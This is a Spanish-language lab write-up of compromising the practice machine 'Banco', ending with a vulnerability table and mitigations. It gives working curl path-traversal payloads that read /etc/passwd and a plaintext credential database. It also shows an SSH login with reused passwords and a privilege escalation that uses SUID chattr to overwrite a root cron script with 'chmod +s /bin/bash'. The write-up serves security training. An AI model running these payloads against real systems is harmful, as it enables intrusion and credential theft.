# Informe de Explotación - Máquina "Banco" (The Hacker Labs)
**IP Objetivo:** 192.168.231.161
**Fecha:** 23 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha comprometido completamente la máquina "Banco" obteniendo acceso root mediante credenciales hardcodeadas en JavaScript, path traversal para lectura de archivos (LFI), reutilización de credenciales de base de datos para SSH, y explotación de `chattr` SUID para quitar atributo inmutable de un script que se ejecuta como root.

**Vectores de ataque utilizados:**
1. Código fuente JavaScript → Credenciales hardcodeadas (`admin` / `DNASdada11THL`) → Login al panel
2. Path Traversal en `descargar.php` → LFI → `/etc/passwd` → Usuario `wvverez`
3. LFI → `config.php` → `dbsuperscretinfact.json` → 12 usuarios con contraseñas en texto plano
4. Reutilización de credenciales → SSH como `wvverez`
5. `chattr` SUID → Quitar inmutabilidad de `backup.sh` → Sobrescribir con `chmod +s /bin/bash` → Espera de cronjob → Root

**Cadena de compromiso:** admin → wvverez → root

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Escaneo de puertos (Nmap)
```bash
nmap -sCV 192.168.231.161 -Pn -vvv -oA bank
```

**Resultado:**
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.2p1 Debian |
| 80/tcp | HTTP | Apache | Apache/2.4.66 (Debian) |
| MAC | - | VMware | 00:0C:29:06:81:E4 |

**Por qué:** Identificar superficie de ataque. Web en puerto 80 es vector principal.

---

## 3. ENUMERACIÓN WEB

### 3.1 Exploración inicial
Al acceder a `http://192.168.231.161` se muestra una web corporativa del Banco de España con:
- Pantalla de login
- Sección "Sobre nosotros"
- Botón de descarga de PDF

### 3.2 Inspección del código fuente
Al inspeccionar el código fuente de la página (`Ctrl+U` o `curl`), se encontró **credenciales hardcodeadas en JavaScript**:

```javascript
let currentPassword = 'DNASdada11THL';
```

**Credenciales encontradas:**
- **Usuario:** `admin`
- **Contraseña:** `DNASdada11THL`

---

## 4. ACCESO AL PANEL ADMINISTRATIVO

### 4.1 Login al panel
Con las credenciales del código fuente se accedió al panel autenticado.

**Panel encontrado:**
- Sección "Sobre nosotros"
- Botón de "Descargar Informe (PDF)"
- Formulario que envía POST a `descargar.php` con parámetro `archivo`

---

## 5. EXPOSICIÓN: PATH TRAVERSAL EN descargar.php

### 5.1 Prueba de Path Traversal
El botón de descarga enviaba un POST a `descargar.php` con:
```
archivo=sobre_nosotros.pdf
```

**Explotación:**
```bash
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../etc/passwd"
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
wvverez:x:1001:1001:wvverez,,,:/home/wvverez:/bin/bash
```

**Análisis:** El parámetro `archivo` no estaba sanitizado. Se confirmó **LFI (Local File Inclusion)** con el usuario `wvverez` identificado.

### 5.2 Lectura de config.php
```bash
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../var/www/html/config.php"
```

**Resultado:**
```php
<?php
define('DB_FILE', __DIR__ . '/dbsuperscretinfact.json');

function db_read() {
 if (!file_exists(DB_FILE)) file_put_contents(DB_FILE, json_encode(['users' => []]));
 return json_decode(file_get_contents(DB_FILE), true);
}
?>
```

**Descubrimiento:** La base de datos estaba en un archivo JSON: `dbsuperscretinfact.json`.

### 5.3 Lectura de la base de datos JSON
```bash
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../var/www/html/dbsuperscretinfact.json"
```

**Resultado:**
```json
{
 "users": [
 {
 "id": 1,
 "username": "admin",
 "password": "Admin@2024!Secure#Hash$9921",
 "role": "administrator"
 },
 {
 "id": 2,
 "username": "root",
 "password": "R00t#P@ssw0rd!Secure$9921#XYZ",
 "role": "superuser"
 },
 {
 "id": 3,
 "username": "wvverez",
 "password": "dasjbdaDASJDASDA11E1DAJDQA",
 "role": "user",
 "ssh_key": "/home/wvverez/.ssh/id_rsa"
 },
 // ... más usuarios
 ]
}
```

**Descubrimiento:** 12 usuarios con contraseñas en texto plano. El usuario `wvverez` tiene una clave SSH configurada.

---

## 6. ACCESO INICIAL

### 6.1 SSH como wvverez (reutilización de credenciales)
```bash
ssh wvverez@192.168.231.161
```

**Contraseña:** `dasjbdaDASJDASDA11E1DAJDQA`

**Resultado:**
```
wvverez@TheHackersLabs-Banco:~$ whoami
wvverez
```

### 6.2 User Flag
```bash
cat /home/wvverez/user.txt
```

---

## 7. ENUMERACIÓN POST-EXPLOTACIÓN

### 7.1 Verificación de sudo
```bash
whoami # wvverez
id # uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)
sudo -l # Sorry, user wvverez may not run sudo on TheHackersLabs-Banco.
```

### 7.2 Búsqueda de SUIDs
```bash
find / -perm -u=s 2>/dev/null
```

**Resultado:**
```
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/lsattr ← INUSUAL
/usr/bin/chattr ← INUSUAL
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

**Análisis:** `lsattr` y `chattr` con SUID son inusuales y representan un vector de escalada.

### 7.3 Análisis de backup.sh
```bash
ls -la /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root 429 jun 7 12:32 /usr/local/bin/backup.sh

lsattr /usr/local/bin/backup.sh
# ----i---------e------- /usr/local/bin/backup.sh
```

**Análisis:**
- Permisos `rwxrwxrwx` — world writable
- Atributo inmutable (`i`) activado — no puede ser modificado directamente
- `chattr` tiene SUID → podemos quitar el atributo inmutable

---

## 8. ESCALADA A ROOT

### 8.1 Quitar inmutabilidad con chattr SUID
```bash
/usr/bin/chattr -i /usr/local/bin/backup.sh
```

**Verificación:**
```bash
lsattr /usr/local/bin/backup.sh
# --------------e------- /usr/local/bin/backup.sh
```

### 8.2 Sobrescribir backup.sh
```bash
echo 'chmod +s /bin/bash' > /usr/local/bin/backup.sh
```

**Verificación:**
```bash
cat /usr/local/bin/backup.sh
# chmod +s /bin/bash
```

### 8.3 Espera de cronjob
```bash
sleep 300
ls -la /bin/bash
```

**Resultado:**
```
-rwsr-sr-x 1 root root 1265648 sep 7 2025 /bin/bash
```

**Análisis:** El cronjob de root ejecutó `backup.sh`, que contiene `chmod +s /bin/bash`. Ahora bash tiene SUID.

### 8.4 Obtención de root
```bash
/bin/bash -p
cat /root/root.txt
```

---

## 9. CADENA DE ATAQUE COMPLETA

```
┌─────────────────────────────────────────────────────────────────┐
│ CADENA DE EXPLOTACIÓN │
├─────────────────────────────────────────────────────────────────┤
│ │
│ [1] RECONOCIMIENTO │
│ ┌─ Nmap ──────────────────┐ │
│ │ Puertos: 22(SSH), 80(HTTP) │
│ └─────────────────────────┘ │
│ │ │
│ ▼ │
│ [2] ENUMERACIÓN WEB │
│ ┌─ Código fuente JS ─────┐ ┌─ Credenciales hardcodeadas ┐ │
│ │ currentPassword variable│────▶│ admin:DNASdada11THL │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [3] ACCESO AL PANEL │
│ ┌─ POST login.php ───────┐ ┌─ Panel de descarga ────────┐ │
│ │ admin:DNASdada11THL │────▶│ descargar.php (archivo=) │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [4] PATH TRAVERSAL → LFI │
│ ┌─ archivo=../../etc/passwd┐ ┌─ wvverez (uid 1001) ──────┐ │
│ │ Sin sanitización │────▶│ LFI confirmado │ │
│ └──────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [5] LECTURA DE BASE DE DATOS │
│ ┌─ config.php ───────────┐ ┌─ dbsuperscretinfact.json ──┐ │
│ │ DB_FILE definido │────▶│ 12 usuarios + pass texto │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [6] ACCESO INICIAL (SSH) │
│ ┌─ wvverez@192.168.231.161┐ ┌─ [USER FLAG] ─────────────┐ │
│ │ dasjbdaDASJDASDA11E1 │────▶│ Reutilización de pass │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [7] ENUMERACIÓN SUID │
│ ┌─ find / -perm -u=s ────┐ ┌─ chattr + lsattr ─────────┐ │
│ │ Binarios inusuales │────▶│ SUID en gestión atributos │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [8] ESCALADA A ROOT │
│ ┌─ chattr -i backup.sh ──┐ ┌─ chmod +s /bin/bash ──────┐ │
│ │ Quitar inmutabilidad │────▶│ Cronjob root ejecuta │ │
│ └─────────────────────────┘ │ bash -p → ROOT │ │
│ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [9] FLAGS │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ USER: [wvverez user.txt] │ │
│ │ ROOT: [root.txt] │ │
│ └────────────────────────────────────────────────────────────┘ │
│ │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. VULNERABILIDADES IDENTIFICADAS

| # | Vulnerabilidad | Severidad | Ubicación | Impacto |
|---|----------------|-----------|-----------|---------|
| 1 | Credenciales hardcodeadas en JavaScript | CRÍTICA | Código fuente web | Acceso al panel administrativo |
| 2 | Path Traversal / LFI sin sanitización | CRÍTICA | `descargar.php` (parámetro `archivo`) | Lectura de archivos arbitrarios |
| 3 | Base de datos JSON con contraseñas en texto plano | CRÍTICA | `dbsuperscretinfact.json` | 12 credenciales expuestas |
| 4 | Reutilización de contraseñas (DB → SSH) | ALTA | wvverez | Acceso SSH con credenciales de la web |
| 5 | SUID en chattr | ALTA | `/usr/bin/chattr` | Quitar atributo inmutable de archivos |
| 6 | backup.sh world writable con cronjob root | CRÍTICA | `/usr/local/bin/backup.sh` | Escalada a root via sobrescritura |
| 7 | Atributo inmutable como única protección | MEDIA | `backup.sh` | Bypass con chattr SUID |

---

## 11. RECOMENDACIONES DE MITIGACIÓN

1. **NUNCA hardcodear credenciales en JavaScript** — Usar autenticación server-side con variables de entorno
2. **Sanitizar parámetros de Path Traversal** — Validar que `archivo` no contenga `../` ni rutas absolutas
3. **No almacenar contraseñas en texto plano** — Usar hashing fuerte (bcrypt, Argon2) con sal única
4. **No reutilizar contraseñas** — La contraseña de la DB nunca debe coincidir con la del sistema
5. **Eliminar SUID de chattr** — `chattr` no necesita SUID para funcionar normalmente
6. **Proteger backup.sh** — No world writable; usar un cronjob específico en lugar de permisos abiertos
7. **Auditar archivos con cronjobs** — Monitorear `/etc/crontab` y scripts ejecutados por root
8. **Implementar least privilege** — wvverez no debería poder modificar archivos del sistema
9. **Usar SELinux/AppArmor** — Restringir capacidades de procesos web

---

## 12. COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
nmap -sCV 192.168.231.161 -Pn -vvv -oA bank

# Inspección de código fuente
curl http://192.168.231.161/

# Path Traversal
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../etc/passwd"
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../var/www/html/config.php"
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../var/www/html/dbsuperscretinfact.json"

# Acceso SSH
ssh wvverez@192.168.231.161

# Enumeración SUID
find / -perm -u=s 2>/dev/null

# Verificar backup.sh
ls -la /usr/local/bin/backup.sh
lsattr /usr/local/bin/backup.sh

# Escalada
/usr/bin/chattr -i /usr/local/bin/backup.sh
echo 'chmod +s /bin/bash' > /usr/local/bin/backup.sh
sleep 300
ls -la /bin/bash
/bin/bash -p
```

---

## 13. EVIDENCIAS DE COMPROMISO

```
┌────────────────────────────────────────────────────────────┐
│ FLAGS OBTENIDAS │
├────────────────────────────────────────────────────────────┤
│ USER (wvverez): [wvverez user.txt] │
│ ROOT: [root.txt] │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│ ACCESOS LOGRADOS │
├────────────────────────────────────────────────────────────┤
│ ✓ Panel admin (credenciales JS hardcodeadas) │
│ ✓ LFI (Path Traversal en descargar.php) │
│ ✓ Lectura de DB JSON (12 usuarios + contraseñas) │
│ ✓ SSH como wvverez (reutilización de credenciales) │
│ ✓ chattr -i → sobrescribir backup.sh │
│ ✓ Cronjob root → chmod +s /bin/bash → Root │
└────────────────────────────────────────────────────────────┘
```

---

**FIN DEL INFORME**



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../apuntes Chema/Wireshark.md|Wireshark]] — Linux, Metasploit, Nmap
- [[Informe_Castor.md|Informe_Castor]] — Kali Linux, Linux, Nmap
- [[Informe_Rockstars.md|Informe_Rockstars]] — Kali Linux, Linux, Nmap
- [[../comandos/Metasploit.md|Metasploit]] — Linux, Metasploit, Nmap
- [[Informe_Inj3ctCrew.md|Informe_Inj3ctCrew]] — Linux, Metasploit, Nmap
- [[../comandos/Tmux.md|Tmux]] — Linux, Metasploit, Redes

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]

> #kali #lfi #linux #metasploit #nmap #post-explotacion #redes #ssh #wireshark
